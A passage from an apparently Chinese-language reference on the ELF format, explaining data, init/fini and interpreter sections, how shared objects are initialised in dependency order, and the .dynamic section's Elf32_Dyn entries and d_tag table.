\u8fd9\u4e9b\u8282\u533a\u5305\u542b\u521d\u59cb\u5316\u4e86\u7684\u6570\u636e\uff0c\u4f1a\u5728\u7a0b\u5e8f\u7684\u5185\u5b58\u6620\u50cf\u4e2d\u51fa\u73b0\u3002 .rodata Section \u00b6 \u8fd9\u4e9b\u8282\u533a\u5305\u542b\u53ea\u8bfb\u6570\u636e\uff0c\u8fd9\u4e9b\u6570\u636e\u901a\u5e38\u53c2\u4e0e\u8fdb\u7a0b\u6620\u50cf\u7684\u4e0d\u53ef\u5199\u6bb5\u3002 Common Code Section \u00b6 \u6982\u8ff0 \u00b6 \u5728\u52a8\u6001\u94fe\u63a5\u5668\u521b\u5efa\u4e86\u8fdb\u7a0b\u955c\u50cf\uff0c\u5e76\u4e14\u6267\u884c\u4e86\u91cd\u5b9a\u4f4d\u540e\uff0c\u6bcf\u4e00\u4e2a\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u90fd\u6709\u673a\u4f1a\u53bb\u6267\u884c\u4e00\u4e9b\u521d\u59cb\u5316\u7684\u4ee3\u7801\u3002\u6240\u6709\u7684\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u4f1a\u5728\u53ef\u6267\u884c\u6587\u4ef6\u83b7\u5f97\u6743\u9650\u4e4b\u524d\u8fdb\u884c\u521d\u59cb\u5316\u3002 \u5728\u8c03\u7528\u76ee\u6807\u6587\u4ef6 A \u7684\u521d\u59cb\u5316\u4ee3\u7801\u4e4b\u524d\uff0c\u4f1a\u9996\u5148\u8c03\u7528\u6240\u6709 A \u4f9d\u8d56\u7684\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u7684\u521d\u59cb\u5316\u4ee3\u7801\u3002\u6bd4\u5982\u8bf4\uff0c\u5982\u679c\u76ee\u6807\u6587\u4ef6 A \u4f9d\u8d56\u4e8e\u53e6\u5916\u4e00\u4e2a\u76ee\u6807\u6587\u4ef6 B\uff0c\u90a3\u4e48 B \u5c31\u4f1a\u5728 A \u7684\u4f9d\u8d56\u5217\u8868\u4e2d\uff0c\u8fd9\u4f1a\u88ab\u8bb0\u5f55\u5728\u52a8\u6001\u7ed3\u6784\u7684 DT_NEEDED \u4e2d\u3002\u5faa\u73af\u4f9d\u8d56\u7684\u521d\u59cb\u5316\u662f\u672a\u88ab\u5b9a\u4e49\u7684\u3002 \u76ee\u6807\u6587\u4ef6\u7684\u521d\u59cb\u5316\u901a\u8fc7\u9012\u5f52\u6bcf\u4e00\u4e2a\u88ab\u4f9d\u8d56\u7684\u8868\u9879\u6765\u5b8c\u6210\u3002\u53ea\u6709\u5f53\u4e00\u4e2a\u76ee\u6807\u6587\u4ef6\u4f9d\u8d56\u7684\u6240\u6709\u7684\u76ee\u6807\u6587\u4ef6\u90fd\u5904\u7406\u5b8c\u81ea\u5df1\u7684\u4f9d\u8d56\u540e\uff0c\u8fd9\u4e2a\u76ee\u6807\u6587\u4ef6\u624d\u4f1a\u6267\u884c\u521d\u59cb\u5316\u4ee3\u7801\u3002 \u4e0b\u9762\u7684\u4f8b\u5b50\u89e3\u91ca\u4e86\u4e24\u79cd\u6b63\u786e\u7684\u53ef\u4ee5\u7528\u6765\u751f\u6210\u7ed9\u5b9a\u4f8b\u5b50\u7684\u987a\u5e8f\u3002\u5728\u8fd9\u4e2a\u4f8b\u5b50\u4e2d\uff0ca.out \u4f9d\u8d56\u4e8eb\uff0cd \u4ee5\u53ca e\u3002b\u4f9d\u8d56\u4e8ed \u548c f\uff0c\u5e76\u4e14 d \u4f9d\u8d56\u4e8e e \u548c g\u3002\u6839\u636e\u8fd9\u4e2a\u4fe1\u606f\uff0c\u6211\u4eec\u53ef\u4ee5\u753b\u51fa\u5982\u4e0b\u7684\u4f9d\u8d56\u56fe\u3002\u90a3\u4e48\u6211\u4eec\u4e0a\u9762\u6240\u8bf4\u7684\u7b97\u6cd5\uff0c\u5c06\u5141\u8bb8\u6211\u4eec\u6309\u7167\u5982\u4e0b\u7684\u987a\u5e8f\u8fdb\u884c\u521d\u59cb\u5316\u3002 \u7c7b\u4f3c\u7684\uff0c\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u4e5f\u4f1a\u6709\u7ed3\u675f\u7684\u51fd\u6570\uff0c\u8fd9\u4e9b\u51fd\u6570\u5728\u8fdb\u7a0b\u5b8c\u6210\u81ea\u5df1\u7684\u7ec8\u6b62\u5e8f\u5217\u65f6\u901a\u8fc7 atexit \u673a\u5236\u6765\u6267\u884c\u3002\u52a8\u6001\u94fe\u63a5\u5668\u8c03\u7528\u7ec8\u6b62\u51fd\u6570\u7684\u987a\u5e8f\u6070\u597d\u4e0e\u4e0a\u9762\u521d\u59cb\u5316\u7684\u987a\u5e8f\u76f8\u53cd\u3002\u52a8\u6001\u94fe\u63a5\u5668\u5c06\u4f1a\u786e\u4fdd\u5b83\u53ea\u4f1a\u6267\u884c\u521d\u59cb\u5316\u6216\u8005\u7ec8\u6b62\u51fd\u6570\u6700\u591a\u4e00\u6b21\u3002 \u5171\u4eab\u76ee\u6807\u6587\u4ef6\u901a\u8fc7\u52a8\u6001\u7ed3\u6784\u4e2d\u7684 DT_INIT \u548c DT_FINI \u6765\u6307\u5b9a\u5b83\u4eec\u7684\u521d\u59cb\u5316\u4ee5\u53ca\u7ed3\u675f\u51fd\u6570\u3002\u5728\u4e00\u822c\u60c5\u51b5\u4e0b\uff0c\u8fd9\u4e9b\u51fd\u6570\u5728.init\u8282\u4e0e.fini\u8282\u4e2d\u3002 \u6ce8\u610f\uff1a \u5c3d\u7ba1ateixt\u7ec8\u6b62\u5904\u7406\u51fd\u6570\u901a\u5e38\u6765\u8bf4\u4f1a\u88ab\u6267\u884c\uff0c\u4f46\u5b83\u5e76\u4e0d\u4f1a\u4fdd\u8bc1\u5728\u7a0b\u5e8f\u6d88\u4ea1\u65f6\u88ab\u6267\u884c\u3002\u66f4\u7279\u6b8a\u7684\u662f\uff0c\u5982\u679c\u7a0b\u5e8f\u8c03\u7528\u4e86_exit\u51fd\u6570\u6216\u8005\u8fdb\u7a0b\u7531\u4e8e\u63a5\u6536\u5230\u4e00\u4e2a\u4fe1\u53f7\u540e\u6d88\u4ea1\u4e86\uff0c\u90a3\u4e48\u5b83\u5c06\u4e0d\u4f1a\u6267\u884c\u5bf9\u5e94\u7684\u51fd\u6570\u3002 \u52a8\u6001\u94fe\u63a5\u5668\u5e76\u4e0d\u8d1f\u8d23\u8c03\u7528\u53ef\u6267\u884c\u6587\u4ef6\u7684 .init \u8282\u6216\u8005\u5229\u7528 atexit \u6ce8\u518c\u53ef\u6267\u884c\u6587\u4ef6\u7684 .fini \u8282\u3002\u7531\u7528\u6237\u901a\u8fc7 atexit \u673a\u5236\u6307\u5b9a\u7684\u7ec8\u6b62\u51fd\u6570\u5fc5\u987b\u5728\u6240\u6709\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u7684\u7ed3\u675f\u51fd\u6570\u524d\u6267\u884c\u3002 .init & .init_array \u00b6 \u6b64\u8282\u533a\u5305\u542b\u53ef\u6267\u884c\u6307\u4ee4\uff0c\u662f\u8fdb\u7a0b\u521d\u59cb\u5316\u4ee3\u7801\u7684\u4e00\u90e8\u5206\u3002\u7a0b\u5e8f\u5f00\u59cb\u6267\u884c\u65f6\uff0c\u7cfb\u7edf\u4f1a\u5728\u5f00\u59cb\u8c03\u7528\u4e3b\u7a0b\u5e8f\u5165\u53e3\uff08\u901a\u5e38\u6307 C \u8bed\u8a00\u7684 main \u51fd\u6570\uff09\u524d\u6267\u884c\u8fd9\u4e9b\u4ee3\u7801\u3002 .text \u00b6 \u6b64\u8282\u533a\u5305\u542b\u7a0b\u5e8f\u7684\u53ef\u6267\u884c\u6307\u4ee4\u3002 .fini & .fini_array \u00b6 \u6b64\u8282\u533a\u5305\u542b\u53ef\u6267\u884c\u7684\u6307\u4ee4\uff0c\u662f\u8fdb\u7a0b\u7ec8\u6b62\u4ee3\u7801\u7684\u4e00\u90e8\u5206\u3002\u7a0b\u5e8f\u6b63\u5e38\u9000\u51fa\u65f6\uff0c\u7cfb\u7edf\u5c06\u6267\u884c\u8fd9\u91cc\u7684\u4ee3\u7801\u3002 Dynamic Related Sections \u00b6 .interp section \u00b6 \u4e00\u822c\u6765\u8bf4\uff0c\u53ef\u6267\u884c\u6587\u4ef6\u5177\u6709\u4e00\u4e2a PT_INTERP \u7c7b\u578b\u7684\u7a0b\u5e8f\u5934\u5143\u7d20\uff0c\u4ee5\u4fbf\u4e8e\u6765\u52a0\u8f7d\u7a0b\u5e8f\u4e2d\u7684\u6bb5\u3002\u8fd9\u4e2a\u8282\u5305\u542b\u4e86\u7a0b\u5e8f\u5bf9\u5e94\u7684\u89e3\u91ca\u5668\u3002\u5728 exec (BA_OS) \u8fc7\u7a0b\u4e2d\uff0c\u7cfb\u7edf\u4f1a\u4ece\u8be5\u8282\u4e2d\u63d0\u53d6\u5bf9\u5e94\u89e3\u91ca\u5668\u7684\u8def\u5f84\uff0c\u5e76\u6839\u636e\u89e3\u91ca\u5668\u6587\u4ef6\u7684\u6bb5\u521b\u5efa\u521d\u59cb\u65f6\u7684\u7a0b\u5e8f\u955c\u50cf\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u7cfb\u7edf\u5e76\u4e0d\u4f7f\u7528\u7ed9\u5b9a\u7684\u53ef\u6267\u884c\u6587\u4ef6\u7684\u955c\u50cf\uff0c\u800c\u4f1a\u9996\u5148\u4e3a\u89e3\u91ca\u5668\u6784\u9020\u72ec\u7acb\u7684\u5185\u5b58\u955c\u50cf\u3002\u56e0\u6b64\uff0c\u89e3\u91ca\u5668\u9700\u8981\u4ece\u7cfb\u7edf\u5904\u83b7\u53d6\u63a7\u5236\u6743\uff0c\u7136\u540e\u4e3a\u5e94\u7528\u7a0b\u5e8f\u63d0\u4f9b\u6267\u884c\u73af\u5883\u3002 \u89e3\u91ca\u5668\u53ef\u80fd\u6709\u4e24\u79cd\u65b9\u5f0f\u83b7\u53d6\u63a7\u5236\u6743\u3002 \u5b83\u53ef\u4ee5\u63a5\u6536\u4e00\u4e2a\u6307\u5411\u6587\u4ef6\u5934\u7684\u6587\u4ef6\u63cf\u8ff0\u7b26\uff0c\u4ee5\u4fbf\u4e8e\u8bfb\u53d6\u53ef\u6267\u884c\u6587\u4ef6\u3002\u5b83\u53ef\u4ee5\u4f7f\u7528\u8fd9\u4e2a\u6587\u4ef6\u63cf\u8ff0\u7b26\u6765\u8bfb\u53d6\u5e76\u5c06\u53ef\u6267\u884c\u6587\u4ef6\u7684\u6bb5\u6620\u5c04\u5230\u5185\u5b58\u4e2d\u3002 \u6709\u65f6\u5019\u6839\u636e\u53ef\u6267\u884c\u6587\u4ef6\u683c\u5f0f\u7684\u4e0d\u540c\uff0c\u7cfb\u7edf\u6709\u53ef\u80fd\u4e0d\u4f1a\u628a\u6587\u4ef6\u63cf\u8ff0\u7b26\u7ed9\u89e3\u91ca\u5668\uff0c\u800c\u662f\u4f1a\u76f4\u63a5\u5c06\u53ef\u6267\u884c\u6587\u4ef6\u52a0\u8f7d\u5230\u5185\u5b58\u4e2d\u3002\u867d\u7136\u6587\u4ef6\u63cf\u8ff0\u7b26\u53ef\u80fd\u4f1a\u51fa\u73b0\u5f02\u5e38\uff0c\u4f46\u662f\u89e3\u91ca\u5668\u7684\u521d\u59cb\u72b6\u6001\u4ecd\u7136\u4f1a\u4e0e\u53ef\u6267\u884c\u6587\u4ef6\u7684\u6536\u5230\u7684\u76f8\u5339\u914d\uff0c\u89e3\u91ca\u5668\u672c\u8eab\u4e0d\u9700\u8981\u518d\u6709\u4e00\u4e2a\u89e3\u91ca\u5668\u3002\u89e3\u91ca\u5668\u672c\u8eab\u53ef\u80fd\u662f\u4e00\u4e2a\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u6216\u8005\u662f\u4e00\u4e2a\u53ef\u6267\u884c\u6587\u4ef6\u3002 \u9700\u8981\u6ce8\u610f\u4ee5\u4e0b\u95ee\u9898 \u5171\u4eab\u76ee\u6807\u6587\u4ef6\uff08\u6b63\u5e38\u60c5\u51b5\u4e0b\uff09\u88ab\u52a0\u8f7d\u4e3a\u5730\u5740\u72ec\u7acb\u7684\uff0c\u4e5f\u5c31\u662f\u8bf4\uff0c\u5bf9\u4e8e\u4e0d\u540c\u7684\u8fdb\u7a0b\u6765\u8bf4\uff0c\u5b83\u7684\u5730\u5740\u4f1a\u6709\u6240\u4e0d\u540c\u3002\u7cfb\u7edf\u901a\u8fc7 mmap (KE_OS) \u4ee5\u53ca\u4e00\u4e9b\u76f8\u5173\u7684\u64cd\u4f5c\u6765\u521b\u5efa\u52a8\u6001\u6bb5\u4e2d\u7684\u5185\u5bb9\u3002\u56e0\u6b64\uff0c\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u7684\u5730\u5740\u901a\u5e38\u6765\u8bf4\u4e0d\u4f1a\u548c\u539f\u6765\u7684\u53ef\u6267\u884c\u6587\u4ef6\u7684\u539f\u6709\u5730\u5740\u51b2\u7a81\u3002 \u53ef\u6267\u884c\u6587\u4ef6\u4e00\u822c\u4f1a\u88ab\u52a0\u8f7d\u5230\u56fa\u5b9a\u7684\u5730\u5740\u3002\u7cfb\u7edf\u901a\u8fc7\u7a0b\u5e8f\u5934\u90e8\u8868\u7684\u865a\u62df\u5730\u5740\u6765\u521b\u5efa\u5bf9\u5e94\u7684\u6bb5\u3002\u56e0\u6b64\uff0c\u4e00\u4e2a\u53ef\u6267\u884c\u6587\u4ef6\u7684\u89e3\u91ca\u5668\u7684\u865a\u62df\u5730\u5740\u53ef\u80fd\u548c\u7b2c\u4e00\u4e2a\u53ef\u6267\u884c\u6587\u4ef6\u51b2\u7a81\u3002\u89e3\u91ca\u5668\u6709\u8d23\u4efb\u6765\u89e3\u51b3\u76f8\u5e94\u7684\u51b2\u7a81\u3002 .dynamic \u00b6 \u5982\u679c\u4e00\u4e2a\u76ee\u6807\u6587\u4ef6\u53c2\u4e0e\u5230\u52a8\u6001\u94fe\u63a5\u7684\u8fc7\u7a0b\u4e2d\uff0c\u90a3\u4e48\u5b83\u7684\u7a0b\u5e8f\u5934\u90e8\u8868\u5c06\u4f1a\u5305\u542b\u4e00\u4e2a\u7c7b\u578b\u4e3a PT_DYNAMIC \u7684\u5143\u7d20\u3002\u8fd9\u4e2a\u6bb5\u5305\u542b\u4e86 .dynamic \u8282\uff0c\u5176\u5b9e\u8fd9\u4e2a\u6bb5\u5c31\u662f\u4e00\u4e2a\u5355\u7eaf\u7684\u952e\u503c\u5bf9\u3002 \u52a8\u6001\u8282\u4e00\u822c\u4fdd\u5b58\u4e86 ELF \u6587\u4ef6\u7684\u5982\u4e0b\u4fe1\u606f \u4f9d\u8d56\u4e8e\u54ea\u4e9b\u52a8\u6001\u5e93 \u52a8\u6001\u7b26\u53f7\u8282\u4fe1\u606f \u52a8\u6001\u5b57\u7b26\u4e32\u8282\u4fe1\u606f \u6211\u4eec\u4e00\u822c\u4f7f\u7528 _DYNAMIC \u7b26\u53f7\u6765\u6807\u8bb0\u8fd9\u4e2a\u8282\uff0c\u5b83\u7684\u7ed3\u6784\u5982\u4e0b typedef struct { Elf32_Sword d_tag; union { Elf32_Word d_val; Elf32_Addr d_ptr; } d_un; } Elf32_Dyn; extern Elf32_Dyn_DYNAMIC[]; \u5176\u4e2d\uff0cd_tag \u7684\u53d6\u503c\u51b3\u5b9a\u4e86\u8be5\u5982\u4f55\u89e3\u91ca d_un\u3002 d_val \u8fd9\u4e2a\u5b57\u6bb5\u8868\u793a\u4e00\u4e2a\u6574\u6570\u503c\uff0c\u53ef\u4ee5\u6709\u591a\u79cd\u610f\u601d\u3002 d_ptr \u8fd9\u4e2a\u5b57\u6bb5\u8868\u793a\u7a0b\u5e8f\u7684\u865a\u62df\u5730\u5740\u3002\u6b63\u5982\u4e4b\u524d\u6240\u8bf4\u7684\uff0c\u4e00\u4e2a\u6587\u4ef6\u7684\u865a\u62df\u5730\u5740\u5728\u6267\u884c\u7684\u8fc7\u7a0b\u4e2d\u53ef\u80fd\u548c\u5185\u5b58\u7684\u865a\u62df\u5730\u5740\u4e0d\u5339\u914d\u3002\u5f53\u89e3\u6790\u52a8\u6001\u7ed3\u6784\u4e2d\u7684\u5730\u5740\u65f6\uff0c\u52a8\u6001\u94fe\u63a5\u5668\u4f1a\u6839\u636e\u539f\u59cb\u6587\u4ef6\u7684\u503c\u4ee5\u53ca\u5185\u5b58\u7684\u57fa\u5730\u5740\u6765\u8ba1\u7b97\u771f\u6b63\u7684\u5730\u5740\u3002\u4e3a\u4e86\u4fdd\u6301\u4e00\u81f4\u6027\uff0c\u6587\u4ef6\u4e2d\u5e76\u4e0d\u4f1a\u5305\u542b\u91cd\u5b9a\u4f4d\u5165\u53e3\u6765\"\u7ea0\u6b63\"\u52a8\u6001\u7ed3\u6784\u4e2d\u7684\u5730\u5740\u3002 \u4e0b\u8868\u603b\u7ed3\u4e86\u53ef\u6267\u884c\u6587\u4ef6\u4ee5\u53ca\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u4e2d\u7684 d_tag \u7684\u9700\u6c42 \u3002\u5982\u679c\u4e00\u4e2a tag \u88ab\u6807\u8bb0\u4e3a\"mandatory\"\uff0c\u90a3\u4e48\u5bf9\u4e8e\u4e00\u4e2a TIS ELF conforming \u7684\u6587\u4ef6\u6765\u8bf4\uff0c\u5176\u52a8\u6001\u94fe\u63a5\u6570\u7ec4\u5fc5\u987b\u5305\u542b\u5bf9\u5e94\u5165\u53e3\u7684\u7c7b\u578b\u3002\u540c\u6837\u7684\uff0c\u201coptional\u201d\u610f\u5473\u7740\u53ef\u4ee5\u6709\uff0c\u4e5f\u53ef\u4ee5\u6709\u6ca1\u6709\u3002 \u540d\u79f0 \u6570\u503c d_un \u53ef\u6267\u884c \u5171\u4eab \u76ee\u6807 \u8bf4\u660e DT_NULL 0 \u5ffd\u7565 \u5fc5\u9700 \u5fc5\u9700 \u6807\u5fd7\u7740 _DYNAMIC \u6570\u7ec4\u7684\u672b\u7aef\u3002 DT_NEEDED 1 d_val \u53ef\u9009 \u53ef\u9009 \u5305\u542b\u4ee5NULL \u7ed3\u5c3e\u7684\u5b57\u7b26\u4e32\u7684\u5b57\u7b26\u4e32\u8868\u504f\u79fb\uff0c\u8be5\u5b57\u7b26\u4e32\u7ed9\u51fa\u67d0\u4e2a\u9700\u8981\u7684\u5e93\u7684\u540d\u79f0\u3002\u6240\u4f7f\u7528\u7684\u7d22\u5f15\u4e3aDT_STRTAB\u7684\u4e0b\u6807\u3002\u52a8\u6001\u6570\u7ec4\u4e2d\u53ef\u4ee5\u5305\u542b\u5f88\u591a\u4e2a\u8fd9\u79cd\u7c7b\u578b\u7684\u6807\u8bb0\u3002\u8fd9\u4e9b\u9879\u5728\u8fd9\u79cd\u7c7b\u578b\u6807\u8bb0\u4e2d\u7684\u76f8\u5bf9\u987a\u5e8f\u6bd4\u8f83\u91cd\u8981\u3002\u4f46\u662f\u4e0e\u5176\u5b83\u7684\u6807\u8bb0\u4e4b\u524d\u7684\u987a\u5e8f\u5012\u65e0\u6240\u8c13\u3002\u5bf9\u5e94\u7684\u6bb5\u4e3a.gnu.version_r\u3002 DT_PLTRELSZ 2 d_val \u53ef\u9009 \u53ef\u9009 \u7ed9\u51fa\u4e0e\u8fc7\u7a0b\u94fe\u63a5\u8868\u76f8\u5173\u7684\u91cd\u5b9a\u4f4d\u9879\u7684\u603b\u7684\u5927\u5c0f\u3002\u5982\u679c\u5b58\u5728DT_JMPREL\u7c7b\u578b\u7684\u9879\uff0c\u90a3\u4e48DT_PLTRELSZ\u4e5f\u5fc5\u987b\u5b58\u5728\u3002 DT_PLTGOT 3 d_ptr \u53ef\u9009 \u53ef\u9009 \u7ed9\u51fa\u4e0e\u8fc7\u7a0b\u94fe\u63a5\u8868\u6216\u8005\u5168\u5c40\u504f\u79fb\u8868\u76f8\u5173\u8054\u7684\u5730\u5740\uff0c\u5bf9\u5e94\u7684\u6bb5.got.plt DT_HASH 4 d_ptr \u5fc5\u9700 \u5fc5\u9700 \u6b64\u7c7b\u578b\u8868\u9879\u5305\u542b\u7b26\u53f7\u54c8\u5e0c\u8868\u7684\u5730\u5740\u3002\u6b64\u54c8\u5e0c\u8868\u6307\u7684\u662f\u88ab DT_SYMTAB \u5f15\u7528\u7684\u7b26\u53f7\u8868\u3002 DT_STRTAB 5 d_ptr \u5fc5\u9700 \u5fc5\u9700 \u6b64\u7c7b\u578b\u8868\u9879\u5305\u542b\u52a8\u6001\u5b57\u7b26\u4e32\u8868\u7684\u5730\u5740\u3002\u7b26\u53f7\u540d\u3001\u5e93\u540d\u3001\u548c\u5176\u5b83\u5b57\u7b26\u4e32\u90fd\u5305\u542b\u5728\u6b64\u8868\u4e2d\u3002\u5bf9\u5e94\u7684\u8282\u7684\u540d\u5b57\u5e94\u8be5\u662f.dynstr\u3002 DT_SYMTAB 6 d_ptr \u5fc5\u9700 \u5fc5\u9700 \u6b64\u7c7b\u578b\u8868\u9879\u5305\u542b\u52a8\u6001\u7b26\u53f7\u8868\u7684\u5730\u5740\u3002\u5bf9 32 \u4f4d\u7684\u6587\u4ef6\u800c\u8a00\uff0c\u8fd9\u4e2a\u7b26\u53f7\u8868\u4e2d\u7684\u6761\u76ee\u7684\u7c7b\u578b\u4e3a Elf32_Sym\u3002 DT_RELA 7 d_ptr \u5fc5\u9700 \u53ef\u9009 \u6b64\u7c7b\u578b\u8868\u9879\u5305\u542b\u91cd\u5b9a\u4f4d\u8868\u7684\u5730\u5740\u3002\u6b64\u8868\u4e2d\u7684\u5143\u7d20\u5305\u542b\u663e\u5f0f\u7684\u8865\u9f50\uff0c\u4f8b\u5982 32 \u4f4d\u6587\u4ef6\u4e2d\u7684 Elf32_Rela\u3002\u76ee\u6807\u6587\u4ef6\u53ef\u80fd\u6709\u591a\u4e2a\u91cd\u5b9a\u4f4d\u8282\u533a\u3002\u5728\u4e3a\u53ef\u6267\u884c\u6587\u4ef6\u6216\u8005\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u521b\u5efa\u91cd\u5b9a\u4f4d\u8868\u65f6\uff0c\u94fe\u63a5\u7f16\u8f91\u5668\u5c06\u8fd9\u4e9b\u8282\u533a\u8fde\u63a5\u8d77\u6765\uff0c\u5f62\u6210\u4e00\u4e2a\u8868\u3002\u5c3d\u7ba1\u5728\u76ee\u6807\u6587\u4ef6\u4e2d\u8fd9\u4e9b\u8282\u533a\u76f8\u4e92\u72ec\u7acb\uff0c\u4f46\u662f\u52a8\u6001\u94fe\u63a5\u5668\u628a\u5b83\u4eec\u89c6\u4e3a\u4e00\u4e2a\u8868\u3002\u5728\u52a8\u6001\u94fe\u63a5\u5668\u4e3a\u53ef\u6267\u884c\u6587\u4ef6\u521b\u5efa\u8fdb\u7a0b\u6620\u50cf\u6216\u8005\u5411\u4e00\u4e2a\u8fdb\u7a0b\u6620\u50cf\u4e2d\u6dfb\u52a0\u67d0\u4e2a\u5171\u4eab\u76ee\u6807\u65f6\uff0c\u8981\u8bfb\u53d6\u91cd\u5b9a\u4f4d\u8868\u5e76\u6267\u884c\u76f8\u5173\u7684\u52a8\u4f5c\u3002\u5982\u679c\u6b64\u5143\u7d20\u5b58\u5728\uff0c\u52a8\u6001\u7ed3\u6784\u4f53\u4e2d\u4e5f\u5fc5\u987b\u5305\u542b DT_RELASZ \u548c DT_RELAENT \u5143\u7d20\u3002\u5982\u679c\u5bf9\u4e8e\u67d0\u4e2a\u6587\u4ef6\u6765\u8bf4\uff0c\u91cd\u5b9a\u4f4d\u662f\u5fc5\u9700\u7684\u8bdd\uff0c\u90a3\u4e48 DT_RELA \u6216\u8005 DT_REL \u90fd\u53ef\u80fd\u5b58\u5728\u3002 DT_RELASZ 8 d_val \u5fc5\u9700 \u53ef\u9009 \u6b64\u7c7b\u578b\u8868\u9879\u5305\u542b DT_RELA \u91cd\u5b9a\u4f4d\u8868\u7684\u603b\u5b57\u8282\u5927\u5c0f\u3002 DT_RELAENT 9 d_val \u5fc5\u9700 \u53ef\u9009 \u6b64\u7c7b\u578b\u8868\u9879\u5305\u542b DT_RELA \u91cd\u5b9a\u4f4d\u9879\u7684\u5b57\u8282\u5927\u5c0f\u3002 DT_STRSZ 10 d_val \u5fc5\u9700 \u5fc5\u9700 \u6b64\u7c7b\u578b\u8868\u9879\u7ed9\u51fa\u5b57\u7b26\u4e32\u8868\u7684\u5b57\u8282\u5927\u5c0f\uff0c\u6309\u5b57\u8282\u6570\u8ba1\u7b97\u3002 DT_SYMENT 11 d_val \u5fc5\u9700 \u5fc5\u9700 \u6b64\u7c7b\u578b\u8868\u9879\u7ed9\u51fa\u7b26\u53f7\u8868\u9879\u7684\u5b57\u8282\u5927\u5c0f\u3002 DT_INIT 12 d_ptr \u53ef\u9009 \u53ef\u9009 \u6b64\u7c7b\u578b\u8868\u9879\u7ed9\u51fa\u521d\u59cb\u5316\u51fd\u6570\u7684\u5730\u5740\u3002 DT_FINI 13 d_ptr \u53ef\u9009 \u53ef\u9009 \u6b64\u7c7b\u578b\u8868\u9879\u7ed9\u51fa\u7ed3\u675f\u51fd\u6570\uff08Termination Function\uff09\u7684\u5730\u5740\u3002 DT_SONAME 14 d_val \u5ffd\u7565 \u53ef\u9009 \u6b64\u7c7b\u578b\u8868\u9879\u7ed9\u51fa\u4e00\u4e2a\u4ee5 NULL \u7ed3\u5c3e\u7684\u5b57\u7b26\u4e32\u7684\u5b57\u7b26\u4e32\u8868\u504f\u79fb\uff0c\u5bf9\u5e94\u7684\u5b57\u7b26\u4e32\u662f\u67d0\u4e2a\u5171\u4eab\u76ee\u6807\u7684\u540d\u79f0\u3002\u8be5\u504f\u79fb\u5b9e\u9645\u4e0a\u662f DT_STRTAB \u4e2d\u7684\u7d22\u5f15\u3002 DT_RPATH 15 d_val \u53ef\u9009 \u5ffd\u7565 \u6b64\u7c7b\u578b\u8868\u9879\u5305\u542b\u4ee5 NULL \u7ed3\u5c3e\u7684\u5b57\u7b26\u4e32\u7684\u5b57\u7b26\u4e32\u8868\u504f\u79fb\uff0c\u5bf9\u5e94\u7684\u5b57\u7b26\u4e32\u662f\u641c\u7d22\u5e93\u65f6\u4f7f\u7528\u7684\u641c\u7d22\u8def\u5f84\u3002\u8be5\u504f\u79fb\u5b9e\u9645\u4e0a\u662f DT_STRTAB \u4e2d\u7684\u7d22\u5f15\u3002 DT_SYMBOLIC 16 \u5ffd\u7565 \u5ffd\u7565 \u53ef\u9009 \u5982\u679c\u8fd9\u79cd\u7c7b\u578b\u8868\u9879\u51fa\u73b0\u5728\u5171\u4eab\u76ee\u6807\u5e93\u4e2d\uff0c\u90a3\u4e48\u8fd9\u5c06\u4f1a\u6539\u53d8\u52a8\u6001\u94fe\u63a5\u5668\u7684\u7b26\u53f7\u89e3\u6790\u7b97\u6cd5\u3002\u52a8\u6001\u8fde\u63a5\u5668\u5c06\u9996\u5148\u9009\u62e9\u4ece\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u672c\u8eab\u5f00\u59cb\u641c\u7d22\u7b26\u53f7\uff0c\u53ea\u6709\u5728\u641c\u7d22\u5931\u8d25\u65f6\uff0c\u624d\u4f1a\u9009\u62e9\u4ece\u53ef\u6267\u884c\u6587\u4ef6\u4e2d\u641c\u7d22\u76f8\u5e94\u7684\u7b26\u53f7\u3002 DT_REL 17 d_ptr \u5fc5\u9700 \u53ef\u9009 \u6b64\u7c7b\u578b\u8868\u9879\u4e0e DT_RELA\u7c7b\u578b\u7684\u8868\u9879\u7c7b\u4f3c\uff0c\u53ea\u662f\u5176\u8868\u683c\u4e2d\u5305\u542b\u9690\u5f0f\u7684\u8865\u9f50\uff0c\u5bf9 32 \u4f4d\u6587\u4ef6\u800c\u8a00\uff0c\u5c31\u662f Elf32_Rel\u3002\u5982\u679cELF\u6587\u4ef6\u4e2d\u5305\u542b\u6b64\u5143\u7d20\uff0c\u90a3\u4e48\u52a8\u6001\u7ed3\u6784\u4e2d\u4e5f\u5fc5\u987b\u5305\u542b DT_RELSZ \u548c DT_RELENT \u7c7b\u578b\u7684\u5143\u7d20\u3002 DT_RELSZ 18 d_val \u5fc5\u9700 \u53ef\u9009 \u6b64\u7c7b\u578b\u8868\u9879\u5305\u542b DT_REL \u91cd\u5b9a\u4f4d\u8868\u7684\u603b\u5b57\u8282\u5927\u5c0f\u3002 DT_RELENT 19 d_val \u5fc5\u9700 \u53ef\u9009 \u6b64\u7c7b\u578b\u8868\u9879\u5305\u542b DT_REL \u91cd\u5b9a\u4f4d\u9879\u7684\u5b57\u8282\u5927\u5c0f\u3002 DT_PLTREL 20 d_val \u53ef\u9009 \u53ef\u9009 \u6b64\u7c7b\u578b\u8868\u9879\u7ed9\u51fa\u8fc7\u7a0b\u94fe\u63a5\u8868\u6240\u5f15\u7528\u7684\u91cd\u5b9a\u4f4d\u9879\u7684\u5730\u5740\u3002\u6839\u636e\u5177\u4f53\u60c5\u51b5\uff0c d_val \u5bf9\u5e94\u7684\u5730\u5740\u53ef\u80fd\u5305\u542b DT_REL \u6216\u8005 DT_RELA\u3002\u8fc7\u7a0b\u94fe\u63a5\u8868\u4e2d\u7684\u6240\u6709\u91cd\u5b9a\u4f4d\u90fd\u5fc5\u987b\u91c7\u7528\u76f8\u540c\u7684\u91cd\u5b9a\u4f4d\u65b9\u5f0f\u3002 DT_DEBUG 21 d_ptr \u53ef\u9009 \u5ffd\u7565 \u6b64\u7c7b\u578b\u8868\u9879\u7528\u4e8e\u8c03\u8bd5\u3002ABI 